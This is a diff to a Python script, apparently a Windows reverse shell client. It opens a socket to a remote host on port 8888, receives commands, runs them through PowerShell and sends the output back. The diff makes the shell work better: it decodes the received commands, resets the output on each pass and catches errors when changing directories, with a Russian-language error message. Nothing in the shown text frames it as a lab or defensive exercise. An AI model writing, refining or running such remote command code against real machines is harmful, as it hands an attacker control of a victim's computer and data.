@@ -7,17 +7,20 @@ PORT = 8888
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
     soc.connect((HOST, PORT))
-    output = ''
-
+    
     while True:
-        server_command = soc.recv(4096)
+        output = ''
+        server_command = soc.recv(4096).decode('utf-8')
         if server_command == 'exit':
             break
 
         if server_command.lower().startswith('cd '):
             command_path = server_command[3:]
-            chdir(command_path)
-            output = getcwd()
+            try:
+                chdir(command_path)
+                output = getcwd()
+            except Exception as err:
+                output = f"[!] Ошибка перехода директории: {err}"
         else:
             try:
                 result = run(['powershell', '-Command', f'chcp 65001 > $null; {server_command}'], capture_output=True, text=True, encoding='utf-8')
@@ -34,7 +37,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
                 output = str(err)
 
         soc.sendall(output.encode('utf-8'))
-        
+
 
 
     
